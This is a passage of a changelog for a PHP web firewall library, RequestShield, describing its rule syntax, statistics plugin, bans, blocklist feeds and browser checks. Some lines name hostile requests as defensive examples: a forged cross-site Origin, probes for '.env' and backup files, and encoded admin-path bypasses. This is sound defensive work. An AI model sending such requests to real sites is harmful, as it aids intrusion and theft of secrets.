  (the rule-file syntax is unchanged) and compiles them into `ext.stats`
  (`enabled`, `parts`, `hours`, `days`, `months`, `flush`, `depth`, `hosts`,
  `skip`, `crawlerLog`), which `StatsPlugin` and the statistics' pages read
  through `StatsExtension::of($settings)`. The `Settings` properties
  `statsEnabled`, `statsHours`, `statsDays`, `statsParts`, `statsFlush`,
  `statsMonths`, `statsDepth`, `statsHosts`, `statsSkip`, `crawlerLogDir`,
  `crawlerLogKinds`, `crawlerLogDays` and `crawlerLogQuery` and the constant
  `Settings::STATS_PARTS` (now `StatsExtension::PARTS`) are gone; in a PHP
  settings array (`Settings::from()`, `Config::defaults()`) the keys live
  under `'ext' => ['stats' => [..., 'crawlerLog' => [...]]]` instead of the
  top-level `'stats'` and `'crawlerLog'`. `StatsPlugin` is appended to the
  settings' plugins by `StatsExtension::plugins()` when the rules are
  compiled -- the `Shield` no longer wires it. `stats-group`, `stats-access`
  and `stats-session` stay in the core until 0031 B.7 (`Access` and `Frame`
  read them); `stats-path` moved in B.5. The extension is only named
  (`REQUEST_SHIELD_EXTENSIONS`: by `bootstrap.php`, or with Composer by
  `plugins/stats/shipped.php` through the package's autoload `files`);
  `Rules\Vocabulary` loads and offers it when the rules are compiled, if
  `plugins/stats` is there -- a passing request loads no class for it. Compiled settings format 42: every installation
  compiles once more after the update, nothing to do
  ([docs](docs/features/RSF06-03-statistics.md)).
- **Shorter cookies** (0031 step A2.2, ADR 0014): the cookies are `rsp` (the
  pass; was `rs_pass`), `rss` (the solution; was `rs_solution`) and `rsd`
  (the statistics session; was `rs_stats`), and the pass cookie is
  `2.<expires base36>.<tag base64url 11>.<mac base64url 22>` -- 43 bytes
  instead of 66, the same 64-bit client tag and 128-bit MAC. A browser sends
  it with every request while the pass lasts; a v1 pass is not read any more
  (the visitor is checked once more). `cookie` and `solution-cookie` in the
  rule file still set other names.
- **Shorter header names** (0031 step A2.1, ADR 0014): the debug header is
  `X-RS: <action> <reason>; rule=<ID>` (was `X-Request-Shield`), a watched
  rule's verdict `X-RS-Monitor` (was `X-Request-Shield-Monitor`), and the
  site asks for the check with `X-RS-Check: 1[; fresh=N]` (was
  `X-Request-Shield-Challenge: required`) -- `rs` = RequestShield. The
  internal header is taken out before the page or the check page goes out
  (`tests/DemoTest.php`). No old name is read any more.
- **A CI leg "minimal hosting"** (0031 step A3.4, ADR 0013 accepted): the
  servers the end-to-end tests start run as a tight shared host would have
  them -- no APCu, no `allow_url_fopen`, the shell functions disabled, 64 MB
  (`TESTS_HOSTING=minimal`); `tests/HostingTiersTest.php` sends the same
  requests at S0, S1 and S2 and expects the same decisions.
- **Updates fetch with curl where `allow_url_fopen` is off** (0031 step A3.3):
  `feeds update` and `crawlers update` use `file_get_contents` or, without
  it, curl (`Http::get()`); where neither can, they say so and what to do
  (run the update elsewhere, copy `store-dir/feeds` and `store-dir/crawlers`).
- **The live view works without APCu** (0031 step A3.2): with the file store
  `set live on` keeps its rows in `<store-dir>/live.log` (full addresses, the
  log's line format, rotated past 500 KB, `live-keep` honoured) instead of
  needing APCu; `set store memory` is the only case that reads the log
  instead. Every use of APCu now goes through `Capability::apcu()`.
- **The defaults leave the system's temp dir**: the compiled settings go to
  `.request-shield/` next to the settings file, the store (counters, the
  secret, lists, feeds, statistics) to `.request-shield/store` there, unless
  `set store-dir` or `protectFile()`'s directory say otherwise. A shared host
  shares `/tmp` between customers; the owner's directory is theirs.
  `protect($array)` without a file keeps the temp dir.

### Added (continued)
- **`bootstrap.php` finds the rules on its own** (0031 step A.4): `REQUEST_SHIELD_CONFIG`
  if set (and then nothing else), else `request-shield.rules` next to it, else
  `config/request-shield.rules`, else `config/request-shield.php`. Before, a
  `.rules` file needed the variable; the README's three-step install now
  holds. `tests/BootstrapTest.php` runs a copy of the library.
- **`request-shield version [site.rules]`** (0031 step A.1): the library's
  version (`Shield::VERSION`, `0.4.0-dev` on main) and build, PHP, whether
  APCu is there, the shipped rule sets' versions; with a rule file also the
  store in use, the mode and the versions the site's files name.
- **The plan for v1.0** (proposal 0031, with its step list and resume prompt
  in `docs/proposals/0031-steps.md`): a robust core, compile-time extension
  points, a mini single-file edition without any backend (proposal 0002),
  hosting tiers, the `rs` prefix for headers and cookies, feature ids (`RSF…`)
  with docs, a demo and tests for every feature, the API and CMS adapters as
  plugins, the repository and release structure; ADRs 0007–0014 (proposed);
  `llms.txt` and the two prompts (`docs/llm/prompts/`) for AI agents; the two
  older drafts as proposals 0032 and 0033; `tests/DocsTest.php` keeps the
  numbers unique and the links whole.
- **Forms in the statistics** (proposal 0028, phase 2; the part `forms`): each
  form (POST, PUT, PATCH, DELETE outside `api-path`) with how many were sent,
  where from (the website's own page, "this website", another website by its
  host only, or none), and how they ended (saved, an error, stopped: refused,
  checked, told to wait, from another website). The card "Forms" on the
  visitors page (stopped links to the live view), `bin/request-shield stats`,
  the JSON. `backend <paths>` marks the editors' area: its forms count as one
  entry per area. Never what was typed
  ([docs](docs/features/RSF06-03-statistics.md#forms-sent-from-where-how-they-ended)).
- **Forms only from the website itself** (proposal 0028, phase 1):
  `post-origin same [missing check|allow|refuse] [except <paths>]`. A POST,
  PUT, PATCH or DELETE must come from one of the website's own names (the
  `host` rule's, the `site` block's, else the name it was sent to): `Origin`,
  else `Referer`. Another website: 403 ("a form sent from another website");
  neither header: the browser check by default (a pass gets through, the form
  is sent again). Never for `except` paths (payment callbacks, single
  sign-on), `api-path` and addresses let in; `monitor post-origin` to try it.
  In the trace ("Where forms come from"), the rules page, the log and the live
  view ([docs](docs/features/RSF02-04-forms-from-the-website.md)). The Exponential rules
  use it (`EXP-ORIGIN`). Examples take `header <Name>:<value>`
  (`expect POST /contact header Origin:https://evil.example 403`).
- **Examples next to the rules** (proposal 0029, phase 1): `expect <METHOD>
  <address> passes|uncached|answered|check|<4xx> [by <ID>] [from <address>]
  [with pass] [times <n>]` below a rule, and `bin/request-shield test` decides
  them, each on a fresh store, with the rules switched on (`--as-written` as
  they are), lists the site's rules without an example, exits 1 when one fails
  and writes JUnit for CI (`--junit`). Never part of the settings a request
  loads. The built-in `scanners`, `wordpress` and `tracking` rules and the
  Exponential rules carry examples (72 and 69); an instruction for language
  models to propose them: `docs/llm/write-rule-examples.md`
  ([docs](docs/features/RSF05-04-rule-examples.md)).
- **A budget for one area** (proposal 0008, second step): `limit` inside a
  `match` block, or `limit … at <paths>`, counts only the requests to that
  area (a search: 10 a minute, while reading pages never uses it up); also
  on demand, in site blocks, watched with `monitor`. An area's budget needs a
  name of its own, so the site-wide pace is never replaced by accident. The
  trace says "not counted at this address" elsewhere
  ([docs](docs/features/RSF03-01-budgets.md#a-budget-for-one-area)).
- **Rules for an Exponential site** (`examples/exponential/`): the frontend
  (`/content/view/…` and admin modules refused, internal files, downloads of
  uploaded archives, view parameters as numbers, a POST only where Exponential
  takes forms, the browser check before login and contact forms, the search's
  fields typed with its time filter and its own budget (a `limit` inside its
  `match` block), pace and a watched
  ban), and a main file for each kind of admin: the siteaccess `/admin`, or a
  host of its own. In monitor mode as shipped; checked against a crawl of a
  real installation; every rule explained in
  [docs/use-cases/exponential.md](docs/use-cases/exponential.md). A click demo
  (`php -S 127.0.0.1:8095 examples/exponential/router.php`): a pretend
  Exponential site with every case as a numbered test.
- **The demo's customer menu** (proposal 0023, phase 5): `/customer-menu`, a
  pretend hosting panel whose "Statistics" item is a signed link to Customer A's
  statistics only; two public demo tokens in its rules; a "Sign out" link on a
  customer's statistics page. `Access::gate()` takes `admin` (the site knows its
  administrator: everything, no form; `?rs-login=1` shows it anyway). The plugin
  guide: what the statistics plugin owns (its words, its address, its pages, who
  may read them) and what a plugin with pages should do the same way
  ([docs](docs/features/RSF06-04-plugins.md#the-statistics-plugin-a-plugin-with-pages-of-its-own)).
- **Access to the statistics per group** (proposal 0023, phase 4):
  `stats-access "Customer A"|* sha256:<hash> [until …]` (only the token's hash;
  `bin/request-shield token` prints a token and the line), `set stats-session`.
  `Access::gate()`: a login form (token by POST, `Origin` checked) and a signed
  session cookie, signed links from a customer's own panel (`Access::link()`,
  10 minutes, at most an hour), `Authorization: Bearer` for the JSON; wrong
  tries counted (10 a minute, then 429) and logged without the token. A
  customer sees only its group — the statistics page enforces it (`who`):
  no Rules & setup, no server overview, no live view or lists, the protection
  without the rules ([docs](docs/features/RSF06-03-statistics.md#who-sees-what-tokens-a-login-signed-links)).
- `set stats-path`: the statistics plugin's own address (default
  `<dashboard-path>/stats`); the core's pages stay at `<dashboard-path>/waf/`.
- Several websites read together (all of them, a group): every page, section,
  page not found and sitemap with its website in front (`a.de/news/x`), and the
  "path starts with" filter takes `a.de/news/`. The pages card, "In short" and
  the pages not found use the full width of the statistics page.
- **Groups of websites and an overview of all websites** (proposal 0023,
  phase 3): `stats-group "Customer A" a.de www.a.de b.de` — a group's
  statistics add its websites up, the website switch has a section per group,
  `bin/request-shield stats --group=`. The new first tab **All websites**
  (`/rs/sites`) shows each group with its websites, the rest and the other
  hosts side by side: page views, the change against the period before, people,
  crawlers, bots, stopped, not found, a small curve — sorted by traffic
  ([docs](docs/features/RSF06-03-statistics.md#all-websites-at-a-glance-rsstatssites)).
- **`stats-skip <paths>`**: paths that are no pages of the site (a map
  proxy's tiles, an image resizer) are left out of the statistics when they
  pass; refused or checked they are still counted, and every rule applies to
  them as before. Also in match and site blocks
  ([docs](docs/features/RSF06-03-statistics.md#paths-that-are-not-counted-stats-skip)).
- **Statistics per website** (proposal 0023, phase 2): `set stats-hosts a.de
  www.a.de *.b.de` (or `host`, `sites`) — each named website counted in its
  own directory (`stats/hosts/<name>/`), any other Host as "other hosts" (a
  made-up name gets no statistics of its own). The pages get a website switch
  (all added up · each · other hosts), kept in every link and the JSON;
  `bin/request-shield stats --site=`. 0.15–0.35 µs per request to find the
  website ([docs](docs/features/RSF06-03-statistics.md#statistics-per-website)).
- The live view links each rule ID to where it is written: its line on the
  rules page, a list entry on the lists page (`LivePage::json(…, ['links' => …])`).
- **Public blocklists as feeds** (proposal 0025): `feed <name> [<https-url>]
  deny|check|count|ban-signal <n> [at <paths>]` — a catalog of ten lists
  (`rules/feeds.json`: Spamhaus DROP, DShield, Feodo, FireHOL level 1, ET,
  blocklist.de, Stop Forum Spam, Tor exits, AWS, Google Cloud; with their
  terms), fetched by cron (`bin/request-shield feeds <main.rules> update`:
  HTTPS, validators, at most as often as each list allows, a list that shrank
  to less than half kept), the site's own network and too-wide ranges taken
  out, compiled into the same table as the deny list (2–3 µs). `deny`: 403
  after the deny list; `check`: the browser check; `ban-signal <n>`: a signal
  counts n times; `count`: watched only. Never exempt addresses, trusted
  proxies, verified crawlers. `set feeds-max-age` (3 d): an older list is not
  used. `feeds … export --format=plain|nginx|nftables|ipset [--write=…]`: the
  deny list and the deny feeds as the fewest CIDR blocks, for the level below
  PHP. A `.htaccess` export was measured and not built: 2,000 ranges made a
  static file 8× slower ([docs](docs/features/RSF01-03-blocklist-feeds.md)).
- **The live view and the lists in the dashboard** (proposal 0026):
  `/rs/live` shows what the shield stops right now (the website, the address,
  the request, what happened, why in words, and where from: a list, a ban, a
  feed, the site's own rule, a built-in one, the pace, the crawler policy),
  updated every 3 s with a cursor, filters kept in the address, pause.
  `set live on` keeps the last 2,000 requests stopped in APCu with the full
  address for `live-keep` (1 h; never on disk; ~5 µs per stopped request), so
  "keep out" takes exactly that address; without it the log is read.
  `/rs/lists`: add an entry with a comment of one's own, extend, change,
  remove, search; the active bans with "lift" (`Store::marks()`); the guards
  of the command line plus never the viewer's own address; POST with a token
  (HMAC of the secret, address and hour). `set ban-keep file`: bans survive a
  restart of APCu. `Report\LivePage`, `ListsPage`, `LogTail`, `Frame`, `Live`
  ([docs](docs/features/RSF06-02-live-and-lists.md)).
- **IP lists and automatic bans** (proposal 0013): `deny <addresses> [until
  …]` keeps an address out with 403 before every other check; `exempt … until`
  lets one in for a while — never counted, never checked, still refused for
  blocked paths and attack patterns. The list files `allow.rules`/`deny.rules`
  in `lists-dir` (default `<store-dir>/lists`) hold only those lines and are
  kept with `bin/request-shield deny|allow|unlist|lists` (guards for trusted
  proxies and wide ranges). The compiled settings are rebuilt when an entry
  ends. `ban after <n> limits|refusals|checks|<budget> in <time> for <time>`:
  nothing but 429 with `Retry-After` for a while, longer for a repeat
  (`ban-growth`, `ban-max`), never for addresses let in, trusted proxies or
  verified crawlers, one ban for every website; `monitor ban` to watch first.
  The store has `mark()`/`marked()`. ~1 µs per request with APCu
  ([docs](docs/features/RSF01-02-ip-lists.md)). Big lists: the deny entries compile into
  one sorted table (`IpTable`), so loading the settings costs the same with a
  million entries as with none and a lookup 2–3 µs; while one request rebuilds
  the settings, the others keep the last ones (`bench/big-lists.php`).
- **Rules per website** (proposal 0024, phase 1): `site <names> { … }` blocks
  in one rule file — the rules outside them for every website, a block adds
  (and sets) its own: `match` blocks, `include`, `no-limit` of a base budget …
  Names exact, `*.domain` (one label) or `default`. Which name decides: `set
  site-from server-name` (the default — the web server's, not the visitor's)
  or `host`. Compiled per website with the base, all checked together; a
  request loads its website's settings without a second check. Budgets of the
  base count across all websites (the defence); a `limit` in a site block
  counts on that website only, under its own counter (`<site>@<name>`, also when
  the browser check frees it). `check` lists the sites, `trace` takes the
  website from the address.
- **Plugins** (proposal 0023, phase 1): the core tells its plugins what it
  decided (`decided()`) and how a request the site answered ended (`ended()`,
  with the status and headers); `Seen` gives them the website, the known crawler
  and whether its address proves it, a bot's family — worked out on demand.
  Named in a rule file (`plugin <class>`) or the PHP settings (`'plugins'`);
  read only; an error in a plugin is logged and never reaches the visitor;
  `check` warns about one it cannot find. No plugin, no cost. A guide with a
  tested example: [docs/features/RSF06-04-plugins.md](docs/features/RSF06-04-plugins.md).
- **The visitors page** ("Visitors & pages", proposal 0022 phase 1): six
  numbers with their change against the period before (page views by people,
  requests by people, crawler visits, bot requests, stopped, not found), one
  chart of the number picked with the period before dashed, "now" (people's
  requests in the last 5 minutes, with APCu), and two cards with tabs: pages
  (pages, sections, stopped, not found) and crawlers & AI (search, AI
  assistants, AI training). Periods: also this month, last month and any range
  (`from`/`to`). Tabs and the chart are radio buttons and CSS — no script; the
  minute refresh keeps what was picked. `StatsReport::periods()` reads only the
  numbers of a span; the buckets count page views (`views`); the report lists
  the pages stopped most (`stopped`). 4–6 ms to render, 7–8 KB gzipped.
- A friendlier check page: a ring around the site's logo that fills with the
  browser's progress while a dot circles it, a smile when it is done (the page
  goes on at once, nobody waits for it), a calm "!" when the check cannot
  finish; dark mode, `prefers-reduced-motion`, nothing moves without
  JavaScript. `set challenge-logo logo.svg` puts the site's own logo in the
  middle -- read once when the settings are compiled, checked strictly (no
  scripts, handlers, outside links or styles; at most 16 KB) and inlined. Inline
  SVG and CSS only: the page is 8.7 KB instead of 6.2 KB (4.1 KB instead of
  3.1 KB gzip), built as fast as before (~11 µs)
  ([docs](docs/features/RSF03-02-browser-challenge.md#how-it-looks)).
- Known query parameters and their types (proposal 0009): `query <name> <type>
  … [at <paths>]` (types `int`, `number`, `word`, `id`, `list`, `text`, `any`,
  `/regex/`; names with `*`; inside `match` blocks too). The attack patterns
  see only what could hold an attack -- `text`, unknown parameters and values
  not of their type, name and value -- and `query strict` answers anything
  else with 404 before they run (6.7 instead of 17.7 µs for such a request with
  `@attacks`). An empty value is of every type. `rules/tracking.rules`
  (`include @tracking`, IDs `TRACK-…`) declares the marketing tags. The rules
  page, `trace`, `show` and `Shield::explain()` name them
  ([docs](docs/features/RSF02-05-known-parameters.md)).
- The demo declares its parameters, includes `@tracking` and runs `query
  strict`.
- Modes (proposal 0004): `set mode off | monitor | enforce | strict`.
  `monitor` checks and counts everything and logs what it would decide
  (`monitor-reject …`, `X-Request-Shield: monitor …`) but refuses nobody;
  `strict`, for a site under attack, checks from a quarter of each limit,
  gives a pass for at most 15 minutes, starts the difficulty at twice its
  minimum and counts addresses a cache must not keep twice; `off` does
  nothing. `monitor` before a rule (`monitor block /old-api/**`, also
  `restrict`, `allow`, `limit`, `challenge`, `query strict`) watches just that
  rule: logged, not enforced, a shared budget counted once. `challenge <paths>
  max-age 5m` asks for a pass from the last five minutes there. The rules page,
  `show` and `trace` name the mode and the watched rules
  ([docs](docs/features/RSF05-03-modes.md)).
- The demo watches a rule (`/old/api`) and has a checkout with `max-age 20s`.

- Known crawlers (proposal 0011): search engines and AI crawlers that behave
  are never given the browser check -- verified by their operators' published
  address lists (shipped in `rules/crawlers/`, a lookup of about half a
  microsecond) or by DNS, never by the name they send. 19 crawlers in
  `rules/crawlers.rules` in four kinds (`search`, `ai-search`, `ai-user`,
  `ai-training`): Google, Bing, Apple, DuckDuckGo, Yandex, Baidu, Qwant,
  Seznam, OpenAI, Anthropic, Perplexity, Amazon, Common Crawl. `crawlers <kind>
  allow|check|block` and `crawler <ID> …` decide per kind or one by one
  (default allow; block answers 403); `set crawler-verify ranges` verifies
  without DNS (a DMZ); a site's own crawler with `crawler <kind> ua … dns …
  ranges ./file.json`. A request that only claims a crawler's name is logged
  with `claimed=<ID>`. `bin/request-shield crawlers <site.rules> [update]`
  lists them and fetches current lists into store-dir; `bin/update-crawler-lists`
  refreshes the shipped lists before a release (a weekly workflow reports
  changes); `trace --ua=…`. The rules page lists the crawlers and counts false
  claims ([docs](docs/features/RSF01-04-known-crawlers.md)).

- Statistics (proposals 0012, 0014): `set stats on` counts, per hour, what the
  shield did (let through, checked, told to wait, refused, the rule behind it,
  the answer's status code -- the site's own at the end of the request), what
  each known crawler did (verified or only claiming the name, let through,
  checked, refused, robots.txt, its top 50 pages a day, its last visit), the
  pages the site did not find and where the links to them are (the site's own
  page, or another site's host), and other bots by family. The parts can be
  switched on one by one (`set stats requests crawlers not-found bots`). With
  APCu a count is one `apcu_inc()`, written to disk every `stats-flush`
  seconds (default 60) so a restart of PHP-FPM loses at most that; without,
  one appended line. Finished hours go into one JSON file per day (hours kept 7
  days, days 400). `bin/request-shield stats [--days=7] [--json]`,
  `Report\StatsReport::build()` and the rules page show it -- with sentences
  such as "OpenAI's training crawler (CRAWL-GPTBOT) came 1,204× in the last 7
  days: every time refused (as set: block)" and "Broken link: /news/x links to
  /old, which was not found". Optional: one log per known crawler and day
  (`set crawler-log <dir>`). About +7 µs a request with APCu in the container
  (+27 µs with files, one appended line). Days, weeks, months and years:
  old days are summed into month files (kept for good, or `stats-months`);
  `stats --from=… --to=… --by=day|week|month|year --crawler=<ID>`
  ([docs](docs/features/RSF06-03-statistics.md)).
- The statistics page, `Report\StatsPage::render()`: tiles with the last 48
  hours, stacked bars for who came (people, crawlers, bots) and what the
  shield did, the answers as a ring, a bar per crawler, sitemaps, pages not
  found with their referrers, rules and bot families -- inline SVG and CSS, dark
  mode, English and German, refreshing itself every minute. The demo shows it
  at `/stats` (and has a `sitemap.xml`; unknown pages answer 404).
- Sitemaps in the statistics: which exist (the site's answer) and which
  verified crawler read which, how often and when last.
- Statistics at scale: housekeeping (flush, roll-up) runs after the response
  (PHP-FPM, LiteSpeed); every limited list stays small under a flood of
  made-up addresses; each statistics directory has its own APCu names (sites on
  one PHP-FPM pool no longer count into each other); a report reads only the
  days it shows. Measured: exact counts under 32 parallel requests, -5 to -10 %
  throughput with APCu at ~6,000 requests a second.

- The most visited pages, by people, crawlers and bots (statistics part
  `pages`, on with `set stats on`): page views (GET, 200, HTML) per path, the
  top 100 an hour for each kind of visitor, and their first two folders, so a
  subtree's views are exact -- `stats --path=/news/` and a "path starts with"
  filter on the statistics page, with "most visited sections".
- What the shield stopped, per page: refused, checked and told to wait, whoever
  asked (the same part `pages`, the top 100 an hour for each). Each page and
  section shows it next to its views; sorted by it ("sorted by: stopped /
  refused / checked / told to wait", `stats --sort=blocked`, `'sort'`), the list
  shows the pages the shield stopped most -- also ones nobody ever saw, like
  `/wp-login.php`. The Protection view starts there.
- **Rules & setup**, a fourth view of the statistics page (`/rs/rules`,
  `'view' => 'rules'`; `Report\SetupPage`): the way of a request through the
  shield, every check in order, on or off, with what it answers; every rule in
  words with its ID, where it is written and how often it decided; every
  technical setting (the secret never shown); a rule tester (an address, a
  visitor, a User-Agent: every step, the diagram, the rule that decides,
  nothing counted); the way as a picture (13 checks on or off, the site or the
  shield's answer, then the log and the statistics and when they write); the
  rules as the rule files hold them, one collapsible part per file, the ID
  first; in English and German. The
  Protection view's rules now say what each does and where it is written, and
  link there. The rules page's groups (`RulesPage::groups(…, $lang)`), the mode,
  the tracer (`new Inspector($s, $store, 'de')`, a step's English `key` beside
  its `check`), `Diagram::trace(…, $lang)` and `Describe::duration()`/`span()`/
  `verdict()`/`reason()` speak German too.
- `set stats-depth 1…4` (default 2): how many folder levels a section's views
  are counted for exactly -- 3 where a language or siteaccess takes the first
  level (`/de/news/2026/`). Each level has its own limit of 200 sections an
  hour, so the many deep ones never crowd out the few above; `check` notes when
  a level overflowed. Measured: one more counter, ~2–3 µs per page view with APCu
  (~0.3 % of a core at 1,000 page views a second), none measurable with files.
- The statistics page in views: an overview, **Visitors & pages** for editors
  and **Protection** for admins, with tabs -- or one of them embedded on its
  own (`'view' => 'all'|'site'|'shield'`, `'tabs' => false`). Each view has its
  own address under `set dashboard-path` (default `/rs`: `/rs/dashboard`,
  `/rs/stats`, `/rs/shield`; `/admin/rs` if wanted); `StatsPage::links()` and
  `::viewFor()` help a site route them; the filters stay GET parameters. The
  demo has them at `/rs/…`, restricted to this machine.

### Fixed
- **`request-shield test` skipped an example of a `deny` line** as "not in
  effect here" -- a deny line is in the list, not in the origins; it is in
  effect now (0031 step F.6).
- **An example's path that starts with `//`** (`expect GET //admin/ 403`) was
  read as an address with the host `admin` and the path `/`, and passed; it
  is the path `//admin/` now, as a browser sends it (0031 step F.4).
- **The statistics on a path of their own are served** (open from the 0031
  D.3 review): with `set stats-path` outside `dashboard-path` (such as
  `/admin/statistics`) the shield never served those pages, because its
  pre-filter looked for `dashboard-path` only. The compiled settings carry
  the prefixes the routes lie below (`routeBases`; just `dashboard-path` by
  default, so one `stripos` as before). A `plugin … from <file>` file is
  watched on every compile, also when its class is loaded already; the
  statistics' unreachable "plugin not installed" warning is gone. Compiled
  settings format 51.
- A ban (`ban after …`) was named by no rule in `explain()`, the trace and
  the log of a banned request's later answers; with one ban rule, it is now
  named by it.
- A POST refused with 405 was named by the last `allow POST` line read, e.g.
  an admin area's own (`match /admin/** { allow POST }`) for a POST to a
  frontend page. It is now named by the first line that allows the method.
- Looking at the statistics changed them: the dashboard's own requests (its
  pages, the live view's feed every 3 s) were counted as requests by people.
  They are left out when they pass; refused or checked they still count. The
  overview of all websites says "requests by people", "crawler visits", "bot
  requests" (with what each counts), as the tiles do.
- An open live view counted against the site's pace limit (its feed every
  3 s) and ran into 429 or the browser check: the dashboard's own pages no
  longer count against the budgets when a `restrict` rule covers them and
  allows the address asking; without one they count as before.
- Two `query` lines naming the same parameter (at different paths) were both
  shown as the later rule on the rules pages; each line now keeps its own ID.
- `set widget-path` accepted a path with `..` in it (`/x/../y`), which could
  never match; it is refused now, like `dashboard-path`.

### Changed
- **The statistics plugin's pages have their own addresses** under
  `<dashboard-path>/stats/`: `/rs/stats/overview`, `/rs/stats/visitors`,
  `/rs/stats/protection`, `/rs/stats/sites`; `/rs/stats` is the plugin's start
  (all websites with `stats-hosts`, else the overview). The core's — the
  firewall's — pages under `<dashboard-path>/waf/`: `/rs/waf/live`,
  `/rs/waf/lists`, `/rs/waf/rules` (`/rs/waf`: the live view). The old addresses
  (`/rs/dashboard`, `/rs/shield`, `/rs/sites`, `/rs/live`, `/rs/lists`,
  `/rs/rules`) are gone: a site that routes them itself (`StatsPage::viewFor()`,
  `Frame::pageFor()`) needs nothing; links and bookmarks to them need the new ones.
- Finding the website for the statistics keeps the last settings' names
  instead of a `WeakMap` (0.10 µs; a crash seen once in CI on PHP 8.0 with APCu).
- **The statistics are the first plugin** (`plugins/stats/`, `StatsPlugin`):
  `set stats on` (or `set crawler-log`) brings them, nothing changes for a site.
  Their classes moved there and keep their names (`Stats`, `Report\StatsReport`,
  `Report\StatsPage`, `Report\VisitorsPage`); `Shield::folders()`,
  `isHtml()`, `isSitemap()` and `statusKeys()` are now `StatsPlugin::…`; a bot's
  family is `Seen::family()` (`Stats::botFamily()` asks it). `Shield::record()`
  tells the plugins. Measured as before: no difference.
- The query string is parsed once per request, for every check that reads it.

## [0.3.0] — 2026-09-30

### Added
- Rule files: the settings one rule per line (`host`, `trust`, `block`,
  `cache-path`, `limit`, `challenge`, `restrict`, `allow`, `set`, `include`,
  …), from a main file, its includes and further sources such as a CMS
  extension's; merged in order, checked when read (errors name `file:line`),
  compiled for OPcache and, with APCu, checked for changes every 10 seconds
  without a `stat()` in between (~5.5 µs setup). `${NAME:-default}` for
  environment variables. `bin/request-shield check|show|reload`
  ([docs](docs/features/RSF05-01-rule-files.md), proposal 0003).
- Access rules: `restrict <paths> to <addresses>` (403 for everyone else) and
  `allow <METHODS> <paths>` (405 elsewhere), matched against the path as the
  application routes it — `//admin`, `/%61dmin` and case do not get past
  ([docs](docs/features/RSF02-03-access-rules.md)).
- Rule IDs: every decision that stops or flags a request names its rule
  (`SITE-10`, `site.rules:12`, `SCAN-BACKUP`, `built-in`) in `X-Request-Shield`,
  `$_SERVER['REQUEST_SHIELD_RULE']` and `Shield::currentRule()`; looked up only
  for such requests.
- An optional log (`set log`, `log-level stop|flag|all|off`, `log-ip
  masked|full`, one rotation at `log-max-size`), one line per request the
  shield stopped or flagged, with the full URL; the address first, anonymised
  by default and written as its network (`198.51.100.0/24`)
  ([docs](docs/features/RSF05-05-log-and-rule-ids.md)).
- `Shield::active()`: the shield `protect()` ran with, so the application
  counts on-demand budgets against the same settings and request
  (`Shield::active()->consume('misses')`); refusals are logged.
- The active rules page (`Report\RulesPage`): the rules in plain words with
  their origin and how often each decided in the last 24 hours, the latest
  activity, and a check that tries any address step by step without counting
  it; refreshes itself. `bin/request-shield trace`
  ([docs](docs/features/RSF06-01-active-rules-page.md)).
- `unblock [<what>] at <paths> [for <addresses>]`: blocked paths let through at
  some paths only — an admin's file reader that has to open `.env` or a
  backup — optionally only for some addresses; the path check is never lifted;
  `check` warns about exceptions for everyone
  ([docs](docs/features/RSF02-03-access-rules.md#exceptions-an-admins-file-reader)).
- Rule IDs of one's own: `[SITE-10]` before a rule names it in decisions,
  the log, the rules page and `trace` instead of `file:line`; `ids <NS>
  [required]` gives a file its number block; an ID used twice is an error
  naming both places; the comment after a rule is its description.
- The built-in blocks are rule files shipped with the library
  (`rules/scanners.rules`, `rules/wordpress.rules`, IDs `SCAN-…`, `WP-…`):
  `include @wordpress`, `unblock [SCAN-CGI]`, `unblock @scanners`
  ([docs](docs/features/RSF05-01-rule-files.md#the-built-in-rules)).
- Versioned rule sets: `version <word>` per rule file, revisions per rule
  (`[SCAN-BACKUP@1]`); a rule that takes back, replaces or opens another names
  the revision reviewed, and `check` and the rules page warn when a library
  update changed it. `replace [ID@n] <rule>` swaps a rule in one line and keeps
  its ID. The built-in rules have `version 2026.09.1` and `rules/CHANGELOG.md`
  (proposal 0005).
- The browser check explained in plain words (`docs/explained/browser-check.md`),
  on the active rules page and, after passing it, in the demo.
- What visitors read is in their language: the check page and the shield's
  own answers in English or German by `Accept-Language` (else English, or
  fixed with `set language de`); own texts per language
  (`set text.de.title …`, `'texts' => ['de.title' => …]`), further languages by
  their texts; `Vary: Accept-Language`.
- The site asks for the browser check: `Shield::active()->requirePass([fresh])`
  before acting on sent content — without a pass the check, and the form is
  sent again by itself afterwards (fields carried in the page, the form token
  too; not files or over 256 KB; a button without JavaScript) — and the
  response header `X-Request-Shield-Challenge: required` on a page
  (`set app-challenge on`). Proposal 0006
  ([docs](docs/features/RSF03-04-app-challenges.md)).
- `set home /`: the shield's own pages (404, 403, a pause, the check page) link
  back to the site ("To the home page", in the visitor's language); the rules
  page takes a link back too. The demo leads back to its front page from
  everywhere.
- Diagrams, drawn as SVG without a library: the path of a request through the
  checks on the rules page, the browser check step by step, and how the shield
  sits in front of a site (README, `docs/explained/`).
- The browser check inside the form (proposal 0010): `set widget-path
  /request-shield` and `Shield::active()->widget()` put a small box into a form
  that fetches a task from the shield's endpoint on the first input, solves it
  while the visitor types and puts the answer into the form; `requirePass()`
  and checked pages take it from there — no check page, files included. The
  page stays cacheable; `widget.js` is a file (CSP), the task ALTCHA's format;
  texts in the visitor's language. Demo: `/contact`.
- `match <path> { … }` in rule files (proposal 0008, first step): the rules of
  an area in one place, their paths the block's — `restrict to …`,
  `allow POST`, `challenge`, `block`, `unblock [ID] for …`, nested blocks,
  blocks by regex. Exactly the rules written out: the same settings, the same
  cost; the rules page shows each rule's area.
- Earn a spent budget back (proposal 0001): `limit … on-exceeded challenge`
  (`'onExceeded' => 'challenge'`) — past the limit the browser check instead of a
  pause; solved, the counter for that budget starts again; no pass gets past it,
  only a solution bound to the budget; twice as hard per solve within an hour,
  from `difficulty-min` up to `difficulty-max`. Forms come back after the
  check; APIs (JSON, `api-path`) get the task as JSON and in
  `Request-Shield-Challenge`, answered with `Request-Shield-Solution`; verified
  crawlers get the pause. `consume($budget, answer: true)` lets the shield
  answer a refusal itself. The default stays the pause. `Store` has `reset()`
  (an interface change for own stores).
- Proposal 0004: modes (`off`, `monitor`, `enforce`, `strict`), `monitor` for
  single rules, a fresh check per path.
- `challenge.alwaysPaths`: paths every visitor has to pass the browser check
  for (once per pass cookie), whatever the budgets say — for a login or admin
  page; a POST without a pass gets 429
  ([docs](docs/features/RSF03-02-browser-challenge.md)).
- A demo site, `examples/demo/`: one example per feature, the check included;
  `php -S 127.0.0.1:8080 examples/demo/router.php`, or in any subdirectory
  of a web server, with rewrite rules (`.htaccess`) or as `index.php/…`; its
  counters and secret stay outside the document root. It shows the full URL,
  the request's headers (those the shield removed struck out), the answer's
